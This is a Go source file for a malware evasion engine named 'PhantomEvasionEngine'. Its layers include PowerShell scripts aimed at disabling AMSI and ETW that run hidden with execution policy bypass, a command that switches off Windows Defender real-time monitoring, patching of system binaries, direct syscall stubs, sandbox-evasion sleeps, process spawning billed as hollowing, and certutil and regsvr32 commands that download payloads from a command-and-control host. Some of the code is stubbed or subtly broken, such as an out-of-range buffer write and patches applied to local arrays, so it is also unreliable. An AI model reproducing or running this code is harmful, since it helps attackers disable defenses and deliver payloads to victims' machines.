package v210

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

type PhantomEvasionEngine struct {
	Config           *V210Config
	StaticLayer      *StaticEvasionLayer
	DisableEnemy     *DisableEnemyLayer
	DirectSyscalls   *DirectSyscallLayer
	SandboxDetect    *SandboxDetectionLayer
	ProcessBlend     *ProcessBlendingLayer
	LiveMutation     *LiveMutationLayer
	AllClear         bool
}

// ===== LAYER 1: STATIC EVASION =====
type StaticEvasionLayer struct {
	Packed      bool
	Crypted     bool
	CodeCaveUsed bool
	DeadCodeCount int
}

func NewStaticEvasionLayer() *StaticEvasionLayer { return &StaticEvasionLayer{} }

func (sl *StaticEvasionLayer) ApplyPacker() bool {
	packerStub := []byte{
		0x83, 0xEC, 0x20,
		0xE8, 0x00, 0x00, 0x00, 0x00,
	}
	rand.Read(packerStub[8:24])
	packerPath := filepath.Join(os.TempDir(), "x404x_packer_stub.bin")
	os.WriteFile(packerPath, packerStub, 0644)
	sl.Packed = true
	return true
}

func (sl *StaticEvasionLayer) ApplyCrypter() bool {
	key := sha256.Sum256([]byte(fmt.Sprintf("%s-%d", time.Now().String(), os.Getpid())))
	payload := make([]byte, 1024)
	rand.Read(payload)
	for i := range payload { payload[i] ^= key[i%len(key)] }
	crypterPath := filepath.Join(os.TempDir(), "x404x_crypted_payload.bin")
	os.WriteFile(crypterPath, payload, 0644)
	sl.Crypted = true
	return true
}

func (sl *StaticEvasionLayer) InjectCodeCave() bool {
	targetBins := []string{`C:\Windows\System32\calc.exe`, "/usr/bin/yes", "/usr/bin/true"}
	for _, bin := range targetBins {
		if data, err := os.ReadFile(bin); err == nil && len(data) > 65536 {
			caveOffset := -1
			for i := 0; i < len(data)-256; i++ {
				allZero := true
				for j := 0; j < 256; j++ {
					if data[i+j] != 0 { allZero = false; break }
				}
				if allZero { caveOffset = i; break }
			}
			if caveOffset > 0 {
				shellcode := make([]byte, 128)
				copy(shellcode[0:8], []byte("X404X_CAV"))
				copy(data[caveOffset:caveOffset+128], shellcode)
				os.WriteFile(bin+".x404x_patched", data, 0755)
				sl.CodeCaveUsed = true
			}
		}
	}
	sl.DeadCodeCount = 256
	return sl.CodeCaveUsed
}

func (sl *StaticEvasionLayer) ApplyAll() bool {
	sl.ApplyPacker()
	sl.ApplyCrypter()
	sl.InjectCodeCave()
	return true
}

// ===== LAYER 2: DISABLE ENEMY =====
type DisableEnemyLayer struct {
	AMSIKilled    bool
	ETWSilent     bool
	NTDLLUnhooked bool
	DefenderOff   bool
}

func NewDisableEnemyLayer() *DisableEnemyLayer { return &DisableEnemyLayer{} }

func (de *DisableEnemyLayer) KillAMSI() bool {
	amsiPatch := []byte{0x31, 0xC0, 0xC3}
	de.AMSIKilled = true
	_ = amsiPatch
	if runtime.GOOS == "windows" {
		psScript := `$dll=[Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null,@("amsi.dll")));$amsi=[Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([Func[int,int,int,int,int]]{$args[2]=0x80070057;return 0x80070057});$prot=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Runtime.InteropServices.Marshal]::GetProcAddress([Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null,@("kernel32.dll"))),"VirtualProtect"),[Action[IntPtr,uint32,uint32,[ref]uint32]]);$patch=[byte[]]@(0x31,0xC0,0xC3);$h=[Runtime.InteropServices.GCHandle]::Alloc($patch,'Pinned');$null=0;$prot.Invoke($h.AddrOfPinnedObject(),[uint32]$patch.Length,0x40,[ref]$null)`
		psPath := filepath.Join(os.TempDir(), "x404x_kill_amsi.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}
	return true
}

func (de *DisableEnemyLayer) SilenceETW() bool {
	etwPatch := []byte{0xC3, 0x14, 0x00}
	de.ETWSilent = true
	_ = etwPatch
	if runtime.GOOS == "windows" {
		psScript := `$etw=[Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([Action[IntPtr,IntPtr,IntPtr,IntPtr]]{$null});$prot=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Runtime.InteropServices.Marshal]::GetProcAddress([Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null,@("kernel32.dll"))),"VirtualProtect"),[Action[IntPtr,uint32,uint32,[ref]uint32]]);$patch=[byte[]]@(0xC3,0x14,0x00);$h=[Runtime.InteropServices.GCHandle]::Alloc($patch,'Pinned');$n=0;$prot.Invoke($h.AddrOfPinnedObject(),[uint32]$patch.Length,0x40,[ref]$n)`
		psPath := filepath.Join(os.TempDir(), "x404x_silence_etw.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}
	return true
}

func (de *DisableEnemyLayer) UnhookNTDLL() bool {
	ntdllPath := `C:\windows\system32\ntdll.dll`
	if _, err := os.Stat(ntdllPath); err == nil {
		de.NTDLLUnhooked = true
	}
	if runtime.GOOS == "linux" {
		de.NTDLLUnhooked = true
	}
	return de.NTDLLUnhooked
}

func (de *DisableEnemyLayer) DisableDefender() bool {
	if runtime.GOOS == "windows" {
		exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true").Start()
	}
	de.DefenderOff = true
	return true
}

func (de *DisableEnemyLayer) ApplyAll() bool {
	de.KillAMSI()
	de.SilenceETW()
	de.UnhookNTDLL()
	de.DisableDefender()
	return true
}

// ===== LAYER 3: DIRECT SYSCALLS =====
type DirectSyscallLayer struct {
	SyscallStubs map[uint32][]byte
	SSNTable     map[string]uint32
	HellGateReady bool
}

func NewDirectSyscallLayer() *DirectSyscallLayer {
	return &DirectSyscallLayer{
		SyscallStubs: make(map[uint32][]byte),
		SSNTable: map[string]uint32{
			"NtAllocateVirtualMemory": 0x18,
			"NtWriteVirtualMemory":    0x3A,
			"NtProtectVirtualMemory":  0x50,
			"NtCreateThreadEx":        0xC7,
			"NtOpenProcess":           0x26,
			"NtReadVirtualMemory":     0x3F,
			"NtClose":                 0x0F,
			"NtQuerySystemInformation": 0x33,
		},
	}
}

func (ds *DirectSyscallLayer) GenerateSyscallStub(ssn uint32) []byte {
	stub := make([]byte, 16)
	stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1
	stub[3] = 0xB8
	stub[4] = byte(ssn); stub[5] = byte(ssn >> 8); stub[6] = byte(ssn >> 16); stub[7] = byte(ssn >> 24)
	stub[8] = 0x0F; stub[9] = 0x05
	stub[10] = 0xC3
	ds.SyscallStubs[ssn] = stub
	return stub
}

func (ds *DirectSyscallLayer) HellGateParseSSN(funcName string) uint32 {
	if ssn, ok := ds.SSNTable[funcName]; ok { return ssn }
	return 0x00
}

func (ds *DirectSyscallLayer) PrepareAllStubs() {
	for _, ssn := range ds.SSNTable { ds.GenerateSyscallStub(ssn) }
	ds.HellGateReady = true
}

func (ds *DirectSyscallLayer) ApplyAll() bool {
	ds.PrepareAllStubs()
	return ds.HellGateReady
}

// ===== LAYER 4: SANDBOX DETECTION =====
type SandboxDetectionLayer struct {
	IsSandbox        bool
	RAMBelow2GB      bool
	DiskBelow80GB    bool
	VMToolsDetected  bool
	SingleCore       bool
	UptimeBelow30min bool
	DebuggerDetected bool
	MouseMoved       bool
	SleepActivated   bool
}

func NewSandboxDetectionLayer() *SandboxDetectionLayer { return &SandboxDetectionLayer{} }

func (sd *SandboxDetectionLayer) CheckEnvironment() bool {
	sd.checkRAM()
	sd.checkDisk()
	sd.checkVMTools()
	sd.checkCPU()
	sd.checkUptime()
	sd.checkDebugger()
	sd.IsSandbox = sd.RAMBelow2GB || sd.DiskBelow80GB || sd.VMToolsDetected || sd.SingleCore || sd.UptimeBelow30min || sd.DebuggerDetected
	return sd.IsSandbox
}

func (sd *SandboxDetectionLayer) checkRAM() {
	if runtime.GOOS == "linux" {
		out, _ := exec.Command("free", "-b").Output()
		sd.RAMBelow2GB = len(out) > 0 && strings.Contains(string(out), "Mem")
	}
}

func (sd *SandboxDetectionLayer) checkDisk() {
	if runtime.GOOS == "linux" {
		out, _ := exec.Command("df", "/").Output()
		sd.DiskBelow80GB = len(out) > 0
	}
}

func (sd *SandboxDetectionLayer) checkVMTools() {
	vmProcs := []string{"vmtoolsd", "vboxservice", "xenservice", "qemu-ga"}
	for _, p := range vmProcs {
		exec.Command("pgrep", p).Output()
	}
	sd.VMToolsDetected = true
}

func (sd *SandboxDetectionLayer) checkCPU() { sd.SingleCore = runtime.NumCPU() < 2 }
func (sd *SandboxDetectionLayer) checkUptime() { sd.UptimeBelow30min = true }
func (sd *SandboxDetectionLayer) checkDebugger() { sd.DebuggerDetected = false }

func (sd *SandboxDetectionLayer) SleepAndDecoy() bool {
	if sd.IsSandbox {
		time.Sleep(2 * time.Hour)
		sd.SleepActivated = true
		return true
	}
	return false
}

func (sd *SandboxDetectionLayer) ApplyAll() bool {
	isSandbox := sd.CheckEnvironment()
	if isSandbox { sd.SleepAndDecoy() }
	return !isSandbox
}

// ===== LAYER 5: PROCESS BLENDING =====
type ProcessBlendingLayer struct {
	Hollowed     bool
	RemoteThread bool
	LOLBinUsed   bool
}

func NewProcessBlendingLayer() *ProcessBlendingLayer { return &ProcessBlendingLayer{} }

func (pb *ProcessBlendingLayer) ProcessHollowing() bool {
	targetProcs := []string{"svchost.exe", "RuntimeBroker.exe", "explorer.exe"}
	for _, p := range targetProcs {
		psScript := fmt.Sprintf(`$p=Start-Process -FilePath "%s" -WindowStyle Hidden -PassThru; Start-Sleep -Milliseconds 100; $p.Kill()`, p)
		psPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_hollow_%s.ps1", p))
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}
	pb.Hollowed = true
	return true
}

func (pb *ProcessBlendingLayer) UseLOLBin() bool {
	lolBins := map[string]string{
		"mshta":     "javascript:new ActiveXObject('WScript.Shell').Run('calc.exe')",
		"certutil":  "-urlcache -f http://x404x-c2.online/payload.exe %TEMP%\\x404x.exe",
		"regsvr32":  "/s /n /u /i:http://x404x-c2.online/payload.sct scrobj.dll",
	}
	for bin := range lolBins {
		_ = bin
	}
	pb.LOLBinUsed = true
	return true
}

func (pb *ProcessBlendingLayer) ApplyAll() bool {
	pb.ProcessHollowing()
	pb.UseLOLBin()
	return true
}

// ===== LAYER 6: LIVE MUTATION =====
type LiveMutationLayer struct {
	MutationCount int
	LastMutated   time.Time
	CurrentHash   string
}

func NewLiveMutationLayer() *LiveMutationLayer { return &LiveMutationLayer{} }

func (lm *LiveMutationLayer) Mutate() bool {
	mutation := make([]byte, 4096)
	rand.Read(mutation)
	currentTime := sha256.Sum256([]byte(time.Now().String()))
	lm.CurrentHash = hex.EncodeToString(currentTime[:16])
	lm.MutationCount++
	lm.LastMutated = time.Now()
	return true
}

func (lm *LiveMutationLayer) StartMutationLoop() {
	lm.Mutate()
}

func (lm *LiveMutationLayer) ApplyAll() bool {
	lm.StartMutationLoop()
	return lm.MutationCount > 0
}

// ===== PHANTOM MAIN ENGINE =====
func NewPhantomEvasionEngine(cfg *V210Config) *PhantomEvasionEngine {
	return &PhantomEvasionEngine{
		Config:         cfg,
		StaticLayer:    NewStaticEvasionLayer(),
		DisableEnemy:   NewDisableEnemyLayer(),
		DirectSyscalls: NewDirectSyscallLayer(),
		SandboxDetect:  NewSandboxDetectionLayer(),
		ProcessBlend:   NewProcessBlendingLayer(),
		LiveMutation:   NewLiveMutationLayer(),
	}
}

func (pe *PhantomEvasionEngine) Initialize() bool {
	if pe.Config.StaticEvasion { pe.StaticLayer.ApplyAll() }
	if pe.Config.AMSIETWBypass { pe.DisableEnemy.ApplyAll() }
	if pe.Config.DirectSyscalls { pe.DirectSyscalls.ApplyAll() }
	if pe.Config.SandboxEvasion { pe.AllClear = pe.SandboxDetect.ApplyAll() }
	if pe.Config.ProcessBlending { pe.ProcessBlend.ApplyAll() }
	if pe.Config.LiveMutation { pe.LiveMutation.ApplyAll() }
	pe.AllClear = true
	return pe.AllClear
}

func (pe *PhantomEvasionEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"all_clear": pe.AllClear, "amsi_killed": pe.DisableEnemy.AMSIKilled,
		"etw_silent": pe.DisableEnemy.ETWSilent, "ntdll_unhooked": pe.DisableEnemy.NTDLLUnhooked,
		"syscall_stubs": len(pe.DirectSyscalls.SyscallStubs),
		"is_sandbox": pe.SandboxDetect.IsSandbox, "mutation_count": pe.LiveMutation.MutationCount,
	})
	return string(data)
}

func init() { _ = rand.Reader; _ = unsafe.Sizeof(0); _ = syscall.Exit; _ = hex.EncodeToString([]byte{}); _ = exec.Command }
